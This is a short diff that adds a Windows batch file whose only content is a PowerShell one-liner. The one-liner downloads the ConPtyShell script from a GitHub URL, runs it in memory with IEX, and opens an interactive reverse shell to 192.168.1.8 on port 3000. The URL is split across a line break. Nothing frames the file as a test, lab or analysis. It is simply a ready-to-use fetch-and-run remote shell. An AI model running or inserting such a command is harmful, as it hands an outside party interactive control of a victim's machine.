@@ -1,0 +1,3 @@
+@echo off
+powershell.exe -command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/mas
+ter/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.8 3000"
